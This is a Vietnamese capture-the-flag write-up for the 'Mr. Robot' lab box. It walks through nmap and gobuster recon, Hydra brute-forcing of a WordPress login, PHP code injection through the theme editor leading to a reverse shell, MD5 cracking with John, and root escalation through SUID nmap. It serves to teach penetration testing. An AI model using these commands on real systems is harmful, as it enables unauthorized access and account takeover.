![image](https://hackmd.io/_uploads/SJ4aKxC5C.png)

# Room info and Comment
## Room info
Based on the Mr. Robot show, can you root this box?

## Comment
Room này là challenge cổ nên việc exploit khá cơ bản vấn đề vẫn hơi mất tgian việc recon

# Recon
## nmap 
Scan được 3 port ssh, http, https
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.10.103.38                             
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-17 06:00 EDT
Nmap scan report for 10.10.103.38
Host is up (0.24s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https

Nmap done: 1 IP address (1 host up) scanned in 15.29 seconds
```
## Port 80 - http
Truy cập vào trang ta có một vài option nhưng chỉ có video và không có tác dụng gì

![image](https://hackmd.io/_uploads/rJe62pg050.png)

### Gobuster
```
gobuster dir -u 'http://10.10.103.38/' -w /usr/share/dirb/wordlists/common.txt
```

![image](https://hackmd.io/_uploads/SJfgbWCcR.png)

Từ kết quả fuzz của gobuster, ta có thể thấy một số directory ẩn như robots, … Truy cập vào /robots, ta có thêm thông tin về key thứ nhất:

![image](https://hackmd.io/_uploads/rJYvWWAq0.png)

Truy cập file key-1-of-3.txt, ta có key đầu tiên

## Port 443 - https 
Mặc dù open nhưng khi truy cập lại **Bad Request**

![image](https://hackmd.io/_uploads/Syu8lZR90.png)

# Exploit
Từ kết quả recon ở trên, truy cập vào /wp-login, ta có thể thấy ngay một form đăng nhập vào CMS của WordPress:

![image](https://hackmd.io/_uploads/BkJa-WC5C.png)

## Hydra
Như recon, ta có 1 dic `fsocity.dic` để brute-force username và password
```
hydra -L fsocity.dic -p test 10.10.103.38 http-post-form "/wp-login:log=^USER^&pwd=^PWD^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.103.38%2Fwp-admin%2F&testcookie=1:F=Invalid username."
```

![image](https://hackmd.io/_uploads/HkesSb050.png)

Ta có được username

Tương tự với password
```
hydra -l Elliot -P fsocity.dic 10.10.103.38 http-post-form "/wp-login:log=^USER^&pwd=^PWD^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.103.38%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username " 
```
Đợi rất rất lâu

## Reverse shell
Vào được admin panel, bước tiếp theo ta sẽ tìm cách truy cập vào server. Trong mục Appearance, ta có thể tìm thấy mục Theme Editor. Tại đó ta có thể chỉnh sửa mã nguồn của các trang mặc định:

![image](https://hackmd.io/_uploads/ry9JzZRcR.png)

![image](https://hackmd.io/_uploads/HJe-MWR5A.png)

Như trong hình là mã nguồn của trang 404.php, và ta có thể chỉnh sửa cả những đoạn code php. Mình sẽ thử chèm thêm dòng system(‘id’); vào. Dòng đó sẽ thực thi lệnh ‘id‘ trên server:

![image](https://hackmd.io/_uploads/S1jWMZAqC.png)

Sau đó truy cập vào 404.php:

![image](https://hackmd.io/_uploads/ByfQMWRc0.png)

Vậy là server đã thực thi lệnh id. Lần tới ta sẽ chèn vào một reverse shell:

![image](https://hackmd.io/_uploads/H1iJXWCq0.png)

Tại thư mục /home/robot có 2 file:

![image](https://hackmd.io/_uploads/SyXKQWR50.png)

Đây chính là key thứ 2, tuy nhiên với user hiện tại ta chưa thể đọc được file này

Vậy là trước tiên ta cần đăng nhập bằng robot để có thể đọc được key thứ 2. Tuy nhiên ta vẫn có thể đọc được file còn lại:

![image](https://hackmd.io/_uploads/HJwim-C9R.png)

## John The Ripper 
Sử dung john để crack mật khẩu này
```
john --format=raw-md5 a.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![image](https://hackmd.io/_uploads/H1BXEZCcC.png)

![image](https://hackmd.io/_uploads/BkliVEbRcC.png)

su cần chạy trong terminal, nên ta sẽ dùng python để spawn một tty shell:
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
Sau đó ta có thể đăng nhập vào user robot. Giờ thì key thứ 2 đã có thể được đọc

Cuối cùng, chúng ta cần tìm cách leo quyền lên root. Kiểm tra các binary được gán SUID với dòng lệnh:
```
find / -perm -u=s -type f 2>/dev/null
```
Ta có một danh sách:

![image](https://hackmd.io/_uploads/BkWuEZCqC.png)

Đập ngay vào mắt là nmap. Với nmap được gán SUID, ta có thể leo quyền qua chế độ interactive của nó, từ đó sinh ra một shell với quyền root. Khởi chạy interactive mode của nmap với dòng lệnh:

![image](https://hackmd.io/_uploads/S1mFV-05R.png)

# Post-Exploit
Nhập lệnh !sh để sinh ra một shell, kết hợp với SUID được gán cho nmap, ta có một root shell:

![image](https://hackmd.io/_uploads/S1HT4WRcC.png)

Việc còn lại chỉ là lấy key cuối

![image](https://hackmd.io/_uploads/B1gC4-05R.png)

--------------------Kết thúc Challenge!--------------------
